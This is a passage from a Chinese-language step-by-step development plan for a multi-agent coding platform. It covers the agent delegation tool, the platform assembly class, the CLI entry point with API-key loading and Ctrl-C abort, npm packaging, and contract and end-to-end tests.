> 这是用户看到的"产品"。CLI 必须稳定、错误提示清晰。

### Step 6.1 — delegate_to_agent ToolHandler

**做什么：** 实现 Orchestrator 委派其他 Agent 的核心工具。

**怎么做：**
1. 创建 `packages/platform/package.json`：依赖所有上述包（shared-types, llm-adapter, tool-core, memory-stm, tools/*）
2. 新建 `packages/platform/src/tools/delegateTool.ts`：
   - interface AgentResolver { get(id: string): Agent | undefined } — 抽象的 Agent 查找接口，解耦具体数据结构
   - class DelegateToAgentHandler implements ToolHandler { id = 'delegate_to_agent'; private resolver: AgentResolver; private llm: LLMAdapter; private registry: ToolRegistry; private compressionRatio: number }
    - constructor(resolver: AgentResolver, llm: LLMAdapter, registry: ToolRegistry, compressionRatio?: number) — 构造函数接收 Agent 查找器 + LLM Adapter + **共享的 ToolRegistry**（由 Platform 组装时注入，包含所有工具 handler）；`compressionRatio` 默认 0.8，从 PlatformConfig 传入
    - getTools() → [{ name: 'delegate_to_agent', parameters: { agentId (string), task (string) } }]
    - execute(call, ctx): args = call.arguments as { agentId, task }；targetAgent = this.resolver.get(args.agentId)；if (!targetAgent) return { content: "Unknown agent", isError: true }；subSessionId = `sub-${uuid}`；stm = new ShortTermMemory()；delegateCtx = { ...ctx, sessionId: subSessionId }（继承原始 ctx 的 cwd/allowedPaths，只改 sessionId）；fullMessages = [{ role: 'system', content: targetAgent.systemPrompt }, { role: 'user', content: args.task }]；result = await runAgentLoop({ agent: targetAgent, messages: fullMessages, registry: this.registry, ctx: delegateCtx, llm: this.llm, memory: stm, compressionRatio: this.compressionRatio })；return JSON.stringify({ agentId, output: result.output })
3. `src/index.ts` — export { DelegateToAgentHandler }

> **V1 注意：** V1 不使用 AgentRegistry（`architecture.md` §2.5），委派是硬编码的：`AgentResolver.get('coding-agent')` 直接返回预先构建好的 Coding Agent 实例。`platform/src/Platform.ts` 中的 `getAgent(id)` 方法用 `if (id === 'coding-agent')` 判断，不走 Registry 查找。

**测试怎么写：**
- [ ] test "delegating to known 'coding-agent' returns structured JSON with output"
- [ ] test "delegating to unknown agent returns isError: true"

**验收标准：**
- [ ] 已知 agentId → 正常委派，返回 { agentId, output } JSON
- [ ] 未知 agentId → { content: "Unknown agent", isError: true }
- [ ] 委派的 STM 在完成后被清理（不泄漏）

---

### Step 6.2 — Agent 配置数据 + 组装函数

**做什么：** 定义 Orchestrator Agent 和 Coding Agent 的配置。**V1 不在 agents.ts 中创建 handler 实例**，避免循环依赖。改为导出配置数据和组装函数，由 Platform（Step 6.3）统一创建 handler 并注入。

**怎么做：**
1. 新建 `packages/platform/src/agents.ts`：
   - import { Agent, ToolHandler, AgentConfig } from '@agent-platform/shared-types'
   - const BUILTIN_AGENTS: AgentConfig[] = [
     { id: 'orchestrator', name: '编排者', description: '负责分解任务、委派专业 Agent、汇总结果', systemPrompt: '你是多智能体编排系统。你不直接写代码。你的职责：分解任务，使用 delegate_to_agent 委派给专业 Agent...' },
     { id: 'coding-agent', name: '编码专家', description: '负责编写、修改、调试代码', systemPrompt: '你是资深开发者。你的职责：编写、修改、调试代码...' }
   ]
   - function buildAgent(config: AgentConfig, handlers: ToolHandler[], params?: Partial<AgentRuntimeParams>): Agent — 合并 config + handler 引用 + runtime params，返回完整 Agent 实例
   - export { BUILTIN_AGENTS, DEFAULT_AGENT_PARAMS, buildAgent }
2. `src/index.ts` — export agents

**验收标准：**
- [ ] BUILTIN_AGENTS 是纯数据数组（不含任何 handler 引用）
- [ ] buildAgent 接收 config + handlers + params，返回完整 Agent
- [ ] **无循环依赖**：agents.ts 不 import tool-core（只 import ToolHandler interface）

---

### Step 6.3 — Platform 组装类

**做什么：** 把 LLM Adapter、Tool Registry、所有工具 Handler、内置 Agent 组装成一个可使用的入口。

**怎么做：**
1. 新建 `packages/platform/src/Platform.ts`：
   - class Platform { private llm: LLMAdapter; private registry: ToolRegistry; private orchestratorAgent: Agent; private config: PlatformConfig }
   - constructor(config: PlatformConfig) — if (!config.llm?.apiKey) throw Error("llm.apiKey required (set ANTHROPIC_API_KEY env var or config file)")；this.config = { ...DEFAULT_CONFIG, ...config }；// 合并用户配置与默认值：
     this.llm = new ClaudeAdapter(this.config.llm)；this.registry = new ToolRegistry()；const fsHandler = new FilesystemHandler()；const gitHandler = new GitHandler()；const termWhitelist = this.config.security?.terminalWhitelist ?? []; const termHandler = new TerminalHandler(termWhitelist)；this.registry.register(fsHandler)；this.registry.register(gitHandler)；this.registry.register(termHandler) — **注意：** ToolRegistry 本身不持有 allowedPaths，安全校验在 execute(ctx) 调用时从 ctx.allowedPaths 读取（见 Step 5.1 的 validateAllowedPaths 逻辑）。Platform.run() 传入的 ctx 包含来自 this.config.security?.allowedPaths 的路径限制。
   - // 先建 handler，再建 delegate（依赖所有 handler）：
     const delegateHandler = new DelegateToAgentHandler({ get: (id) => this.getAgent(id)! }, this.llm, this.registry, this.config.runtime?.compressionRatio)；this.registry.register(delegateHandler)
   - // 最后组装 Agent 实例（从 BUILTIN_AGENTS + config 合并 runtime params）：
     this.orchestratorAgent = buildAgent(BUILTIN_AGENTS[0], [delegateHandler], { model: 'claude-sonnet-4', temperature: 0.3 })
   - private agentsCache = new Map<string, Agent>() — 缓存已创建的子 Agent（如 coding-agent）
   - private getAgent(id: string): Agent | undefined — if (id === 'coding-agent') { const termWhitelist = this.config.security?.terminalWhitelist ?? []; const a = buildAgent(BUILTIN_AGENTS[1], [new FilesystemHandler(), new GitHandler(), new TerminalHandler(termWhitelist)]); this.agentsCache.set(id, a); return a }；return undefined
   - async createSession(agentId: string, projectRoot: string): 验证 agentId → return { id: uuid(), agentId, projectRoot, stm: new ShortTermMemory() }
   - async run(request: string, signal?: AbortSignal): Promise<AgentResult> — try { session = await this.createSession('orchestrator', process.cwd())；ctx = { sessionId: session.id, agentId: 'orchestrator', cwd: projectRoot, allowedPaths: this.config.security?.allowedPaths ?? [projectRoot] }；messages = [{ role: 'user', content: request }]；result = await runAgentLoop({ agent: this.orchestratorAgent, messages, registry: this.registry, ctx, llm: this.llm, memory: session.stm, maxIterations: this.config.runtime?.maxIterations, compressionRatio: this.config.runtime?.compressionRatio })；return result } catch (e) { return { status: 'failed', agentId: 'orchestrator', error: (e as Error).message } }
2. `src/index.ts` — export { Platform }

> **V1 MVP 耦合说明：** constructor 中直接 new FilesystemHandler/GitHandler/TerminalHandler 是 V1 的可接受简化（只有 3 个固定工具，无生态扩展需求）。若未来需解耦，抽 `createHandlers(config)` 工厂函数。

**测试怎么写：**
- [ ] test "constructor throws when apiKey is empty or missing"
- [ ] test "createSession returns Session with independent STM instances" — 两次调用，验证 stm 不是同一个对象引用
- [ ] test "TerminalHandler uses custom whitelist from config" — 传入自定义白名单，验证内置默认值被覆盖
- [ ] test "run() with pre-aborted signal returns aborted result immediately" — 在 Platform.run 前 abort signal，验证返回 status='aborted'

**验收标准：**
- [ ] 缺少 API Key → 构造函数抛错（不静默失败）
- [ ] createSession 返回的每个 Session 有独立的 STM 实例
- [ ] run() 最终返回 AgentResult（status 为 completed/failed/aborted）
- [ ] TerminalHandler whitelist 正确覆盖内置默认值
- [ ] run() 收到已 abort 的 signal → 不执行 LLM 调用，直接返回 aborted

---

### Step 6.4 — CLI 入口

**做什么：** 提供用户交互界面——readline 输入，Platform.run 调用，结果输出。SIGINT 通过 AbortController 中断 Agent Loop。

**怎么做：**
1. 新建 `apps/cli/src/index.ts`：
   - #!/usr/bin/env node
   - `import os from 'node:os'; import path from 'node:path'; import fs from 'node:fs';`（ESM — 项目规定全量 `"type": "module"`）；`const CONFIG_DIR = path.join(os.homedir(), '.agent-platform'); const CONFIG_FILE = path.join(CONFIG_DIR, 'config.json')`
   - // 配置加载：~/.agent-platform/config.json > process.env.ANTHROPIC_API_KEY > throw
   - let userConfig: Partial<PlatformConfig> = {}; try { userConfig = JSON.parse(fs.readFileSync(CONFIG_FILE, 'utf-8')); } catch { /* 配置文件不存在或格式错误，fallback */ }
   - const envApiKey = process.env.ANTHROPIC_API_KEY; const apiKey = userConfig.llm?.apiKey ?? envApiKey
   - if (!apiKey) { console.error("ANTHROPIC_API_KEY required: set in ~/.agent-platform/config.json or as environment variable"); process.exit(1); }
   - // 合并配置：用户配置 + 内置默认 Agent 列表（如果用户没提供）
   - const config: PlatformConfig = { llm: { ...DEFAULT_LLM, provider: 'anthropic', apiKey }, agents: userConfig.agents ?? BUILTIN_AGENTS, runtime: { ...DEFAULT_CONFIG.runtime, ...userConfig.runtime }, security: { ...DEFAULT_CONFIG.security, ...userConfig.security }, cli: { prompt: userConfig.cli?.prompt ?? DEFAULT_CONFIG.cli?.prompt } }
   - const abortController = new AbortController()
   - process.on('SIGINT', () => { abortController.abort(); console.log('\nExiting...'); })  // 不直接 process.exit(0)，让 runAgentLoop 检测到 signal.aborted 后自然退出，避免 SIGINT 在 runAgentLoop 内部抛错
   - const platform = new Platform(config)
   - 使用 readline.createInterface(process.stdin, process.stdout) 显示提示符 config.cli.prompt，读取用户输入
   - **输入清理**：`const sanitizedInput = input.trim()` — 仅 trim 空白。不额外过滤字符（保留中文等 Unicode 输入）。真正的安全防线在 ToolRegistry.allowedPaths 校验和 TerminalHandler 白名单，不在 CLI 层做粗暴的字符过滤。
   - try { const result = await platform.run(sanitizedInput, abortController.signal); if (result.output) { console.log(result.output); } else { const msg = result.status === 'failed' ? `[LLM temporarily unavailable: ${result.error}] Retry by re-entering your request.` : `Error: ${result.error}`; console.error(msg); } } catch (e) { if ((e as Error).name === 'AbortError') return; console.error(`Platform error: ${(e as Error).message}`); }
   - 如果 runAgentLoop 返回 status='aborted'，CLI 不打印错误信息（这是用户主动中断的正常结果）
2. 确认 package.json bin 字段指向此文件

**测试怎么写：**
- [ ] test "missing API_KEY exits with error message" — Mock fs.readFileSync + process.env，验证 exit code ≠ 0 + 错误信息含 "ANTHROPIC_API_KEY"
- [ ] test "SIGINT prints 'Exiting...' and does NOT print error for aborted result" — Mock readline, emit SIGINT during platform.run, verify clean exit without error message
- [ ] test "config.json apiKey takes precedence over env var" — Mock config file + env，验证使用文件中的 key

**验收标准：**
- [ ] `node index.ts` 启动后显示提示符（来自 config.cli.prompt），可输入并回车
- [ ] API Key 优先级：config.json > process.env.ANTHROPIC_API_KEY > throw
- [ ] Ctrl-C → "Exiting..." + clean exit，agent aborted 时不打印错误信息
- [ ] LLM 返回 failed → 显示友好错误提示（`[LLM temporarily unavailable: ...] Retry by re-entering your request.`），不暴露内部错误堆栈

---

### Step 6.5 — package.json bin 配置 + 打包验证

**做什么：** 确保 CLI 可通过 npm/pnpm 全局安装。

**怎么做：**
1. `apps/cli/package.json`：添加 `"bin": { "agent-platform": "dist/cli.js" }`（指向 esbuild 输出路径）；添加 `"files": ["dist"]`（不包含 src，V1 不暴露源码）
2. `pnpm run build` — tsc 编译所有包 + build.mjs 打包 CLI（两步串联在根 scripts 中已配置），输出到 `apps/cli/dist/cli.js`
3. `npm pack` — 验证生成 .tgz，内含 dist/cli.js 入口文件

**验收标准：**
- [ ] `npm pack` 成功生成 .tgz（无 errors/warnings）
- [ ] tgz 内含 `dist/cli.js` 可执行文件
- [ ] bin 字段指向 `dist/cli.js`

---

## Phase 7: 集成测试 + E2E 验证

> **dependsOn:** [Phase 1, Phase 2, Phase 3, Phase 4, Phase 5, Phase 6]

### Step 7.1 — Contract Testing (LLM Adapter)

**做什么：** 定义一套标准消息，Claude adapter 必须通过此合同测试。为未来多模型兼容预留。

**怎么做：**
1. 创建 `tests/contract-tests/llm.spec.ts`：
   - const standardMessages = [{ role: 'system', content: 'You are a helpful assistant.' }, { role: 'user', content: 'Hello' }] as ChatMessage[]
   - describe('LLMAdapter Contract') — 所有 LLM adapter 实现 import 运行此测试
   - test "complete() returns structured response matching ChatResponse" — Mock fetch，验证返回结构

**验收标准：**
- [ ] 测试套件独立于具体 adapter（可被 ClaudeAdapter、未来 OpenAI Adapter 共用）
- [ ] 定义了标准输入消息和预期输出结构

---

### Step 7.2 — E2E: 完整编码流程

**做什么：** 端到端验证：用户请求 → Orchestrator → Coding Agent → 写文件 → 结果返回。

**怎么做：**
1. 创建 `tests/e2e/encoding-flow.spec.ts`：
   - **Mock LLM** — 推荐方案 A：在 ClaudeAdapter 构造函数中注入 `fetchFn?: typeof fetch`，测试时传入 mock fetch 返回预设响应。这样不依赖 native fetch 的 monkey-patch（native fetch + AbortController 组合下 vi.spyOn(global, 'fetch') 可能失效）
     - **备选方案 B**：使用 `undici` 的 MockAgent — `new MockAgent().intercept(...)`，对原生 fetch 友好
   - 模拟响应应包含完整的 tool_call → write_file → text response 流程
   - Mock filesystem handler：拦截文件系统操作，验证 write_file 被调用且内容正确
   - 测试流程：new Platform() → platform.run("实现一个快速排序函数") → 验证临时目录中存在 .ts 文件，内容含 "sort" 关键字

**验收标准：**
- [ ] **方案 A**（推荐）: ClaudeAdapter 构造函数注入 fetchFn，测试时传入 mock fetch；或 **方案 B**: undici MockAgent — 不依赖 native fetch monkey-patch
- [ ] **断言 1**：目标 .ts 文件被创建在临时目录中
- [ ] **断言 2**：文件内容包含 "sort" 或 "quickSort" 关键字
- [ ] **断言 3**：最终 output 非空

---

## 验收流程

每个 Phase 完成后，合并前必须逐项通过：

```
[ ] pnpm run build — 零错误
[ ] pnpm run lint — 零警告
[ ] pnpm run test — 全部通过，覆盖率 ≥ 80%
[ ] 上述所有 Step 的验收标准打勾确认
[ ] git add + commit（conventional commit format）
```
